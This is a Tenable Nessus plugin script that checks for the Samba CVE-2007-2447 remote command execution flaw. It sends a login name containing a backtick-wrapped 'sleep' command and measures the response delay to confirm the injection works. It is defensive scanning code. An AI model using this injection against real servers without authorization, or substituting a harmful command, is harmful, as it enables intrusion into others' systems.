#
# (C) Tenable Network Security, Inc.
#
# @NOAGENT@
#

include("compat.inc");

if (description)
{
  script_id(82580);
  script_version("1.8");
  script_set_attribute(attribute:"plugin_modification_date", value:"2020/03/09");

  script_cve_id("CVE-2007-2447");
  script_bugtraq_id(23972);
  script_xref(name:"CERT", value:"268336");

  script_name(english:"Samba 3.0.0 'SamrChangePassword' RCE");
  script_summary(english:"Attempts to exploit the issue.");

  script_set_attribute(attribute:"synopsis", value:
"The file and print server running on the remote host is affected by a
remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Samba running on the remote host is affected by a
remote code execution vulnerability due to improper validation of
user-supplied input when passing RPC messages from external scripts to
a shell. A remote, authenticated attacker can exploit this via the use
of shell metacharacters during login negotiations when the 'username
map script' option is enabled, or during the invocation of other
printer and file management MS-RPC calls.");
  script_set_attribute(attribute:"see_also", value:"https://www.samba.org/samba/security/CVE-2007-2447.html");
  script_set_attribute(attribute:"solution", value:
"Upgrade to version 3.0.25 or later");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:S/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2007-2447");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Samba "username map script" Command Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2007/05/14");
  script_set_attribute(attribute:"patch_publication_date", value:"2007/05/14");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/04/06");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:samba:samba");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2015-2020 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("smb_nativelanman.nasl");
  script_require_keys("SMB/NativeLanManager");
  script_exclude_keys("global_settings/supplied_logins_only");
  script_require_ports("Services/smb", 139, 445);

  exit(0);
}

include("smb_func.inc");
include("global_settings.inc");
include("misc_func.inc");
include("audit.inc");

lanman = get_kb_item_or_exit("SMB/NativeLanManager");
if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);

port     = kb_smb_transport();

if("Samba" >!< lanman)
  audit(AUDIT_NOT_DETECT,"Samba",port);

timings  = make_list(3,9,15);
variance = 2;

report = NULL;
foreach timing (timings)
{
  if(!smb_session_init(timeout:timing+variance+1, report_access_trouble:FALSE, report_auth_failure:FALSE))
    audit(AUDIT_FN_FAIL, 'smb_session_init');
  
  cmd   = 'sleep '+timing;
  login = '`' + cmd + '`';
  then  = unixtime();
  retv  = NetUseAdd(login:login, password:rand_str(length:8), share:"IPC$");
  now   = unixtime();
  delta = now-then;
  if(delta < timing || delta > timing+variance)
    audit(AUDIT_LISTEN_NOT_VULN,"Samba",port);
  else
    report += '\n    '+cmd+" (server's response was delayed by "+delta+" seconds)";
  NetUseDel();
}

if(isnull(report))
  audit(AUDIT_LISTEN_NOT_VULN,"Samba",port);

report = '\n  Nessus was able to run the following commands : '+report+'\n';
security_report_v4(port:port, extra:report, severity:SECURITY_WARNING);
